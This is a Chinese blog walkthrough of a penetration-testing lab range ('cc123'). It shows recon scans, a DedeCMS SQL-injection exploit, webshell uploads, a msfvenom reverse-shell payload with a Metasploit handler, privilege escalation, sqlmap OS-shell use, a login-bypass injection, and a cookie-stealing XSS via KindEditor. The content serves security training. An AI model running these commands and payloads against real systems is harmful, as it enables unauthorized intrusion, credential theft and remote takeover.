<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 暗月项目四-cc123靶场 · Patrik's Blog</title><meta name="description" content="暗月项目四-cc123靶场 - Patrik"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Patrik's Blog"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Patrik's Blog" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">主页</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">归档</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">暗月项目四-cc123靶场</h1><div class="post-info">2022年1月20日</div><div class="post-content"><span id="more"></span>
<h2 id="cc123靶场拓扑图"><a href="#cc123靶场拓扑图" class="headerlink" title="cc123靶场拓扑图"></a>cc123靶场拓扑图</h2><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105141605099.png" alt="image-20220105141605099"></p>
<p>共包含4个flag</p>
<p>（因个人实验环境的特殊情况，使用了两台kali攻击机，IP分别为192.168.137.22与192.168.137.185）</p>
<!-- more -->

<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-0-创建文件夹"><a href="#1-0-创建文件夹" class="headerlink" title="1.0 创建文件夹"></a>1.0 创建文件夹</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105142954593.png" alt="image-20220105142954593"></p>
<h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo net discover -i eth0 -r 192.168.134.0/24</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105142140390.png15" alt="image-20220105142140390"></p>
<h3 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo masscan -p 1-65535 192.168.137.134 --rate=1000</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105143946034.png22" alt="image-20220105143946034"></p>
<h3 id="1-3-端口信息探测"><a href="#1-3-端口信息探测" class="headerlink" title="1.3 端口信息探测"></a>1.3 端口信息探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sC -A 192.168.137.134 -p53,80,135,999,3389,6588,49154,49155 -oA cc123-port</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105144634836.png" alt="image-20220105144634836"></p>
<h3 id="1-4-网站信息"><a href="#1-4-网站信息" class="headerlink" title="1.4 网站信息"></a>1.4 网站信息</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105150414683.png36" alt="image-20220105150414683"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105150446843.png47" alt="image-20220105150446843"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105150517846.png54" alt="image-20220105150517846"></p>
<h3 id="1-5-绑定本地hosts-x2F-网关设置"><a href="#1-5-绑定本地hosts-x2F-网关设置" class="headerlink" title="1.5 绑定本地hosts&#x2F;网关设置"></a>1.5 绑定本地hosts&#x2F;网关设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">绑定hosts</span><br><span class="line">C:\Windows\System32\drivers\etc</span><br><span class="line">192.168.137.134 www.cc123.com</span><br><span class="line">DNS：192.168.137.134</span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">sudo vi /etc/hosts</span><br><span class="line">192.168.137.134 www.cc123.com</span><br><span class="line">sudo vi /etc/resolv.conf</span><br><span class="line">nameserver 192.168.137.134</span><br></pre></td></tr></table></figure>

<h3 id="1-6-子域名穷举"><a href="#1-6-子域名穷举" class="headerlink" title="1.6 子域名穷举"></a>1.6 子域名穷举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot; --hw 53</span><br><span class="line">#kali内总是报错 查不出原因 </span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105161044599.png06" alt="image-20220105161044599"></p>
<table>
<thead>
<tr>
<th>KesionEDU</th>
<th><a target="_blank" rel="noopener" href="http://www.cc123.com/">www.cc123.com</a></th>
</tr>
</thead>
<tbody><tr>
<td>dedecms</td>
<td>new.cc123.com</td>
</tr>
<tr>
<td>Net</td>
<td>ww2.cc123.com</td>
</tr>
</tbody></table>
<h2 id="2-漏洞测试"><a href="#2-漏洞测试" class="headerlink" title="2.漏洞测试"></a>2.漏洞测试</h2><h3 id="2-1-dedecms安全测试"><a href="#2-1-dedecms安全测试" class="headerlink" title="2.1 dedecms安全测试"></a>2.1 dedecms安全测试</h3><h4 id="查看版本号"><a href="#查看版本号" class="headerlink" title="查看版本号"></a>查看版本号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://new.cc123.com/data/admin/ver.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105162605149.png23" alt="image-20220105162605149"></p>
<p>版本为20150618 该版本存在注入漏洞</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220117103642064.png29" alt="image-20220117103642064"></p>
<h4 id="查看管理后台是否开启"><a href="#查看管理后台是否开启" class="headerlink" title="查看管理后台是否开启"></a>查看管理后台是否开启</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://new.cc123.com/dede</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105163030212.png40" alt="image-20220105163030212"></p>
<p>管理后台开启，尝试默认密码，错误失败</p>
<h4 id="查看会员注册是否开启"><a href="#查看会员注册是否开启" class="headerlink" title="查看会员注册是否开启"></a>查看会员注册是否开启</h4><p>&#x2F;member – 发现开放会员注册 – 注册用户 – byesec –  登录</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105161436256.png55" alt="image-20220105161436256"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105161801696.png07" alt="image-20220105161801696"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105161920404.png14" alt="image-20220105161920404"></p>
<h4 id="注入漏洞利用"><a href="#注入漏洞利用" class="headerlink" title="注入漏洞利用"></a>注入漏洞利用</h4><h5 id="新建分类"><a href="#新建分类" class="headerlink" title="新建分类"></a>新建分类</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105165343523.png30" alt="image-20220105165343523"></p>
<h5 id="复制cookie"><a href="#复制cookie" class="headerlink" title="复制cookie"></a>复制cookie</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105165827417.png36" alt="image-20220105165827417"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105165957478.png42" alt="image-20220105165957478"></p>
<h5 id="配置exp"><a href="#配置exp" class="headerlink" title="配置exp"></a>配置exp</h5><p>放入exp目录下的cookie.txt文件内并修改exp</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105170208038.png48" alt="image-20220105170208038"></p>
<h5 id="执行exp"><a href="#执行exp" class="headerlink" title="执行exp"></a>执行exp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Dedecms_20150618_member_sqli.py http://new.cc123.com</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105171636328.png55" alt="image-20220105171636328"></p>
<p>得到加密的密码 812df726be884ddcfc41</p>
<p><img src="https://gitee.com/byesec/picture/raw/master/2021-1/image-20220105171806378.png" alt="image-20220105171806378"></p>
<p>最终的到admin的密码为admin7788</p>
<h5 id="进入后台管理系统登陆"><a href="#进入后台管理系统登陆" class="headerlink" title="进入后台管理系统登陆"></a>进入后台管理系统登陆</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://new.cc123.com/dede</span><br><span class="line">admin</span><br><span class="line">admin7788</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220105172007094.png02" alt="image-20220105172007094"></p>
<p>登陆成功</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1627image-20220105172052018.png11" alt="image-20220105172052018"></p>
<p>上传一句话木马</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1629image-20220105172143524.png20" alt="image-20220105172143524"></p>
<p>写入木马上传</p>
<p><img src="https://gitee.com/byesec/picture/raw/master/uPic/1629image-20220105172401188.png" alt="image-20220105172401188"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1630image-20220105172603430.png37" alt="image-20220105172603430"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1631image-20220105172637529.png45" alt="image-20220105172637529"></p>
<p>使用蚁剑连接</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1631image-20220105173951031.png52" alt="image-20220105173951031"></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>在蚁剑内翻阅目录发现权限不足</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1632image-20220105173951031.png02" alt="image-20220105173951031"></p>
<p>发现在目录下是NET环境，尝试上传.NET文件看能否解析执行</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1632image-20220105175318757.png20" alt="image-20220105175318757"></p>
<p>上传webshell到根部录下的&#x2F;a内</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1634image-20220106093024524.png27" alt="image-20220106093024524"></p>
<p>访问ASPXSpy2014.aspx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://new.cc123.com/a/ASPXSpy2014.aspx</span><br></pre></td></tr></table></figure>

<p>输入密码admin</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1640image-20220106094028758.png34" alt="image-20220106094028758"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1641image-20220106094241337.png40" alt="image-20220106094241337"></p>
<p>尝试是否可以执行命令</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1642image-20220106094315945.png45" alt="image-20220106094315945"></p>
<p>结果显示可以执行命令</p>
<p>下一步的思路是：能否在msf内生成payload执行以达到提权的目的</p>
<p>msf生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.137.22 lport=12345 -f exe &gt;s.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1643image-20220106095651519.png57" alt="image-20220106095651519"></p>
<p>上传生成的s.exe，发现可能是写权限不足</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1643image-20220106095955787.png03" alt="image-20220106095955787"></p>
<p>上传使用wt.asp脚本来扫描可写目录</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1644image-20220106100241167.png17" alt="image-20220106100241167"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://new.cc123.com/a/wt.asp</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1644image-20220106101417517.png32" alt="image-20220106101417517"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1645image-20220106101518186.png45" alt="image-20220106101518186"></p>
<p>尝试向c:\windows\debug\WIA\目录内上传s.exe</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220106101921905.png52" alt="image-20220106101921905"></p>
<p>上传成功后配置msf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.137.22</span><br><span class="line"></span><br><span class="line">set lport 12345</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1646image-20220106102311623.png03" alt="image-20220106102311623"></p>
<p>执行s.exe</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1647image-20220106102603447.png19" alt="image-20220106102603447"></p>
<p>成功反弹shell</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1647image-20220106102643899.png08" alt="image-20220106102643899"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1648image-20220106102917805.png17" alt="image-20220106102917805"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1649image-20220106103001792.png33" alt="image-20220106103001792"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set session 1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/1649image-20220106103658401.png40" alt="image-20220106103658401"></p>
<p>⚠️：kali的msf内没有可用的exp</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220106110056898.png" alt="image-20220106110056898"></p>
<p>⚠️：经过询问得知是新版本的kali内的msf对本项目，在提权的时候存在一些不可知的问题，故采用老版本的kali2020.1进行尝试</p>
<p>重新生成c.exe-执行反弹shell-搜索可用的本地提权</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220106122617785.png" alt="image-20220106122617785"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220106122930265.png" alt="image-20220106122930265"></p>
<p>成功提权至系统权限</p>
<p>查看flag</p>
<h3 id="2-2-ww2-cc123-com安全测试"><a href="#2-2-ww2-cc123-com安全测试" class="headerlink" title="2.2 ww2.cc123.com安全测试"></a>2.2 ww2.cc123.com安全测试</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220106142531457.png" alt="image-20220106142531457"></p>
<p>复制响应头</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/165616image-20220106142657082.png09" alt="image-20220106142657082"></p>
<p>分析响应头</p>
<p>仍然为ASP.NET 版本4.0</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/165616image-20220106142755251.png17" alt="image-20220106142755251"></p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>gobuster连接超时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#x27;aspx,html&#x27; -o ~/cc123/cc123-ww2-dir.log</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220106154748426.png" alt="image-20220106154748426"></p>
<p>dirsearch连接超时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://ww2.cc123.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e aspx,html -o cc123-ww2.log</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/165916image-20220114165917028.png30" alt="image-20220114165917028"></p>
<p>可能是因为配置原因..在kali内这两个工具都无法连接</p>
<p>救急采用了御剑</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/165916image-20220106161641310.png37" alt="image-20220106161641310"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://ww2.cc123.com/admin</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/165916image-20220106161849933.png48" alt="image-20220106161849933"></p>
<p>尝试了默认密码&#x2F;弱口令等无果</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170017image-20220106162204624.png57" alt="image-20220106162204624"></p>
<p>使用burpsuite对该页面进行抓包分析</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170017image-20220106162836820.png05" alt="image-20220106162836820"></p>
<p>右键–Request in browser–in original session–copy–浏览器访问</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170017image-20220106163347072.png11" alt="image-20220106163347072"></p>
<p>重复提交包，并未对验证码进行校验（可能存在验证码重复利用漏洞），可直接发送至Intruder模块对其进行密码的爆破</p>
<h4 id="后台登陆页-SQL注入漏洞"><a href="#后台登陆页-SQL注入漏洞" class="headerlink" title="后台登陆页-SQL注入漏洞"></a>后台登陆页-SQL注入漏洞</h4><p>在Repeater内检测</p>
<p>修改用户名为admin’ 但结果并没有报错</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170017image-20220106163915371.png23" alt="image-20220106163915371"></p>
<p>修改用户名为admin’–+ 尝试注释后面的语句 页面发生了重定向</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170117image-20220106164038132.png31" alt="image-20220106164038132"></p>
<p>猜测其查询语句大致为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;admin&#x27; and password=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>

<p>添加注释后则为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;admin&#x27;-- &#x27; and password=&#x27;123456&#x27;</span><br><span class="line">select * from users where username=&#x27;admin&#x27; #则只执行了该语句</span><br></pre></td></tr></table></figure>

<p>在浏览器内尝试提交用户名admin’–空格   密码任意</p>
<p>利用该漏洞成功以管理员身份登陆进入了后台管理系统</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170117image-20220106164749119.png44" alt="image-20220106164749119"></p>
<h4 id="后台内-SQLMAP测试SQL注入"><a href="#后台内-SQLMAP测试SQL注入" class="headerlink" title="后台内-SQLMAP测试SQL注入"></a>后台内-SQLMAP测试SQL注入</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170117image-20220110101910993.png52" alt="image-20220110101910993"></p>
<p>将抓取到的页面包放入SQLMAP中进行测试（bp.txt）</p>
<p>测试是否存在注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bp.txt --dbms mssql -v 1 --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114170228801.png" alt="image-20220114170228801"></p>
<p>列库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bp.txt --dbms mssql -v 1 --dbs</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114170354079.png" alt="image-20220114170354079"></p>
<p>查询数据无法直接看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bp.txt --dbms mssql -v 1 -D grams_data -T username --dump</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220110104337746.png" alt="image-20220110104337746"></p>
<p>获取mssql的shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r bp.txt --dbms mssql -v 1 --os-shell</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220110103712249.png" alt="image-20220110103712249"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220110103804859.png" alt="image-20220110103804859"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/170517image-20220110103943402.png22" alt="image-20220110103943402"></p>
<p>主机名为WIN-JJU7KU45PN7。根据以上信息猜测为站库分离。</p>
<h4 id="NET代码审计"><a href="#NET代码审计" class="headerlink" title=".NET代码审计"></a>.NET代码审计</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c:\HwsHostMaster\wwwroot\ww2cc123_55m39g\web\bin</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220110105330264.png" alt="image-20220110105330264"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220110105456556.png" alt="image-20220110105456556"></p>
<p>下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download c:\HwsHostMaster\wwwroot\ww2cc123_55m39g\web\bin</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220110105910519.png" alt="image-20220110105910519"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220110110050372.png" alt="image-20220110110050372"></p>
<p>拷贝至本地IlSpy反编译dll进行审计</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172217image-20220114090608874.png50" alt="image-20220114090608874"></p>
<h5 id="验证码重复使用漏洞"><a href="#验证码重复使用漏洞" class="headerlink" title="验证码重复使用漏洞"></a>验证码重复使用漏洞</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172317image-20220110115555917.png58" alt="image-20220110115555917">漏洞验证</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172417image-20220110115925979.png06" alt="image-20220110115925979"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172517image-20220110120137804.png13" alt="image-20220110120137804"></p>
<h5 id="后台管理登陆SQL注入漏洞"><a href="#后台管理登陆SQL注入漏洞" class="headerlink" title="后台管理登陆SQL注入漏洞"></a>后台管理登陆SQL注入漏洞</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172517image-20220114091117775.png24" alt="image-20220114091117775"></p>
<p>漏洞验证</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172517image-20220114093100487.png44" alt="image-20220114093100487"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114093122880.png" alt="image-20220114093122880"></p>
<h5 id="后台文件SQL注入漏洞"><a href="#后台文件SQL注入漏洞" class="headerlink" title="后台文件SQL注入漏洞"></a>后台文件SQL注入漏洞</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114095030882.png" alt="image-20220114095030882"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114093515301.png" alt="image-20220114093515301"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114095243902.png" alt="image-20220114095243902"></p>
<p>漏洞验证</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114100149401.png" alt="image-20220114100149401"></p>
<h5 id="后台编辑器KindEditor漏洞"><a href="#后台编辑器KindEditor漏洞" class="headerlink" title="后台编辑器KindEditor漏洞"></a>后台编辑器KindEditor漏洞</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114100045676.png" alt="image-20220114100045676"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114103106885.png" alt="image-20220114103106885"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172717image-20220114100424391.png21" alt="image-20220114100424391"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172817image-20220114100512643.png34" alt="image-20220114100512643"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172817image-20220114100540040.png47" alt="image-20220114100540040"></p>
<p>抓包修改验证</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172817image-20220114101155076.png07" alt="image-20220114101155076"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172817image-20220114101256651.png20" alt="image-20220114101256651"></p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172817image-20220114101629577.png55" alt="image-20220114101629577"></p>
<p>访问ww2.cc123.com&#x2F;editor&#x2F;asp.net&#x2F;..&#x2F;attached&#x2F;file&#x2F;20220114&#x2F;20220114101159_6235.html</p>
<p>成功弹回cookie</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/172917image-20220114101957669.png07" alt="image-20220114101957669"></p>
<h5 id="前台XSS漏洞"><a href="#前台XSS漏洞" class="headerlink" title="前台XSS漏洞"></a>前台XSS漏洞</h5><p>查看前台文件</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220114105555276.png" alt="image-20220114105555276"></p>
